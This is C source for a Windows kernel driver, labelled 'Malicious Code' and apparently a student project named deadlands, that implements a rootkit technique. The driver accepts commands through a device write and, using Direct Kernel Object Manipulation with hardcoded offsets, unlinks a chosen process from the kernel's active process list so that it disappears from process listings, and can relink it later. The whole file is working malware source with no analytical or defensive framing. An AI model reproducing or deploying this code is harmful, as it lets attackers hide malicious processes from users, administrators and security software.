/*
**
** Malicious Code - Project: deadlands
** Filename	: [ deadlands-dkom.c ]
** Method	: [ Direct Kernel Object Manipulation ]
** Epi-Tek4 : [ Armand Morgan, Hochwelker Florent, Toumi Majdi ]
**
*/

#include <ntddk.h>
#include <string.h>
#include <stdlib.h>
#include "deadlands-dkom.h"

/*
** INITIALIZATIONS:
*/
static pMyList		pNode = NULL;

/*
** DRIVER FUNCTIONS:
*/
NTSTATUS	DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
{
	DWORD			i;
	NTSTATUS		status;
	PDEVICE_OBJECT	pDeviceObject;
	UNICODE_STRING	deviceName;
	UNICODE_STRING	dosDeviceName;

	DbgPrint("[MSG]: deadlands DKOM - driver entry\n");

	pDeviceObject = NULL;
	RtlInitUnicodeString(&deviceName, DEVICE_NAME);
	RtlInitUnicodeString(&dosDeviceName, DOSDEVICE_NAME);
	status = IoCreateDevice(pDriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &pDeviceObject);
	if (status != STATUS_SUCCESS)
	{
		DbgPrint("[ERR]: deadlands DKOM - can't create I/O device!\n");
		return (status);
	}
	  
	pDeviceObject->Flags |= DO_BUFFERED_IO;
	
	pDriverObject->DriverUnload = DriverUnload;
	for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
		pDriverObject->MajorFunction[i] = DriverIrpUnsupported;

	pDriverObject->MajorFunction[IRP_MJ_CREATE] = DriverIrpCreate;
	pDriverObject->MajorFunction[IRP_MJ_CLOSE] = DriverIrpClose;
	pDriverObject->MajorFunction[IRP_MJ_WRITE] = DriverIrpWrite;
	
	IoCreateSymbolicLink(&dosDeviceName, &deviceName);

	return (STATUS_SUCCESS);
}

NTSTATUS	DriverUnload(PDRIVER_OBJECT pDriverObject)
{
	UNICODE_STRING	dosDeviceName;
	PLIST_ENTRY		pCurr;
	pMyList			pData;
	
	DbgPrint("[MSG]: deadlands DKOM - driver unload\n");

	while (pNode != NULL)
	{
		pCurr = pNode->Node;
		pCurr->Blink->Flink = pCurr;
		pCurr->Flink->Blink = pCurr;

		pData = pNode;
		pNode = pNode->Next;
		ExFreePool(pData);
		DbgPrint("LOOp\n");
	}

	RtlInitUnicodeString(&dosDeviceName, DOSDEVICE_NAME);
	IoDeleteSymbolicLink(&dosDeviceName);
	IoDeleteDevice(pDriverObject->DeviceObject);

	return (STATUS_SUCCESS);
}

NTSTATUS	DriverIrpUnsupported(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
{
	DbgPrint("[MSG]: deadlands DKOM - driver irp unsupported\n");
	return (STATUS_NOT_SUPPORTED);
}

NTSTATUS	DriverIrpCreate(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
{
	DbgPrint("[MSG]: deadlands DKOM - driver irp create\n");
	return (STATUS_SUCCESS);
}

NTSTATUS	DriverIrpClose(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
{
	DbgPrint("[MSG]: deadlands DKOM - driver irp close\n");
	return (STATUS_SUCCESS);
}

NTSTATUS	DriverIrpWrite(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
{
	PIO_STACK_LOCATION	pIoStackIrp;
	NTSTATUS			NTstatus;
	PCHAR				pInputBuffer;
	DWORD				pid;
	
	DbgPrint("[MSG]: deadlands DKOM - driver irp write\n");

	pIoStackIrp = IoGetCurrentIrpStackLocation(pIrp);
	pInputBuffer = (PCHAR)pIrp->AssociatedIrp.SystemBuffer;

	pid = 42;
	if (pInputBuffer != NULL && strlen(pInputBuffer) >= 2)
	{
		pid = atoi(&pInputBuffer[1]);
		if (pInputBuffer[0] == 'h')
			return (HideProcess(pid));
		else if (pInputBuffer[0] == 'v')
			return (ViewProcess(pid));
	}
	pInputBuffer = NULL;
	return (STATUS_UNSUCCESSFUL);
}

/*
** ALGORITHM: DKOM
*/
NTSTATUS	HideProcess(INT32 pid)
{
	DWORD		eprocess;
	PLIST_ENTRY	pList;
	pMyList		pData;
	pMyList		pCurr;

	DbgPrint("[MSG]: deadlands DKOM - process to hide [pid #%d]\n", pid);
	eprocess = GetEPROCESS(pid);
	if (!eprocess)
	{
		DbgPrint("[ERR]: deadlands DKOM - GetEPROCESS failed\n", pid);
		return (STATUS_UNSUCCESSFUL);
	}

	pList = (PLIST_ENTRY)(eprocess + OFFSET_FLINK);
	pList->Blink->Flink = pList->Flink;
	pList->Flink->Blink = pList->Blink;

	//pList->Flink = NULL;

	if (!(pData = (pMyList)ExAllocatePoolWithTag(NonPagedPool, sizeof(*pNode), '_GAT')))
		return (STATUS_NO_MEMORY);
	pData->Node = pList;
	pData->Pid = pid;
	pData->Next = NULL;
	
	if (pNode == NULL)
		pNode = pData;
	else
	{
		pCurr = pNode;
		while (pCurr->Next != NULL)
			pCurr = pCurr->Next;
		pCurr->Next = pData;
	}
  return (STATUS_SUCCESS);
}

NTSTATUS	ViewProcess(INT32 pid)
{
	PLIST_ENTRY	pCurr;
	pMyList		pList;
	pMyList		pData;
	pMyList		pPrev;
	DWORD		eprocess;
	INT32		value;

	DbgPrint("[MSG]: deadlands DKOM - process to review [pid #%d]\n", pid);

	pPrev = NULL;
	pList = pNode;
	while (pList != NULL)
	{
		pCurr = pList->Node;
		eprocess = ((DWORD)pCurr->Flink) - OFFSET_FLINK;
		value = *((INT32 *)(eprocess + OFFSET_PID));
		
		if (pid == pList->Pid)
		{
			DbgPrint("[MSG]: deadlands DKOM - process pid found at 0x%x\n", eprocess);
			
			pData = pList;
			if (pPrev == NULL)
				pNode = pList->Next;
			else
				pPrev->Next = pList->Next;
			
			pCurr->Blink->Flink = pCurr;
			pCurr->Flink->Blink = pCurr;
			ExFreePool(pData);
			break;
		}
		pPrev = pList;
		pList = pList->Next;
	}
	if (pList == NULL)
		return (STATUS_UNSUCCESSFUL);
	else
		return (STATUS_SUCCESS);
}

DWORD	GetEPROCESS(INT32 pid)
{
	PLIST_ENTRY	pList;
	DWORD			eprocess;
	INT32			begin;
	INT32			value;
	INT32			step;

	eprocess = 0;
	if (pid == 0)
		return (eprocess);
	step = 0;
	eprocess = (DWORD)PsGetCurrentProcess();
	begin = *((INT32 *)(eprocess + OFFSET_PID));
	value = begin;
	while (42)
	{
		if (pid == value)
		{
			DbgPrint("[MSG]: deadlands DKOM - process pid found at 0x%x\n", eprocess);
			break;
		}
		else if (step && value == begin)
		{
			eprocess = 0;
			break;
		}
		else
		{
			pList = (PLIST_ENTRY)(eprocess + OFFSET_FLINK);
			eprocess = ((DWORD)pList->Flink) - OFFSET_FLINK;
			value = *((INT32 *)(eprocess + OFFSET_PID));
			step++;
		}
	}
	return (eprocess);
}
